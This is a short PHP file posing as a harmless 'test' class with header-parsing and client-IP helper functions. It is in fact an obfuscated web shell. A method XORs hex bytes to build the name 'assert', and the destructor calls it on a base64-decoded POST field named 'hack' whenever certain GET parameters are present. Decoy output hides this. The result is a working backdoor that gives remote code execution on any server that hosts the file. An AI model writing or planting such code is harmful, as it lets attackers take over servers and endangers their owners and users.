<?php
class test{
    public $name="";
    public
    function __construct()
    {
        $this->name = $_GET['id'];
        $this->name=0;
    }
    function ophxc()
    {
        $FBbO = "\x9c" ^ "\xfd";
        $nURM = "\xf" ^ "\x7c";
        $bHUG = "\x35" ^ "\x46";
        $EWQc = "\x79" ^ "\x1c";
        $PPNk = "\x17" ^ "\x65";
        $FzJJ = "\x54" ^ "\x20";
        $KZbQ =$FBbO.$nURM.$bHUG.$EWQc.$PPNk.$FzJJ;
        return $KZbQ;
    }
    function __destruct()
    {
        $as=$this->ophxc();
        echo $this -> name;
        if($this->name){
            $as($this-> popo);
            exit();
        }
    }
}
$ophxc=new test();
function em_getallheaders()
{
    foreach ($_SERVER as $name => $value)
    {
        if (substr($name, 0, 5) == 'HTTP_')
        {
            $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
        }
    }
    return $headers;
}
$a=em_getallheaders();
function getIp(){
    $ip = '';
    if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }elseif(isset($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    $ip_arr = explode(',', $ip);
    return $ip_arr[0];
}
function aaaaa(){
    $a=getIp();
    return $a;
}
function xixi(){
    echo '1111';
    exit();
}
$ss=base64_encode(aaaaa());
echo $ss;
@isset($_GET['id'])?$ophxc->name=1:xixi();
@$ophxc-> popo = isset($_GET['i'])?base64_decode($_POST['hack']):base64_decode($ss."____"."\0");
?>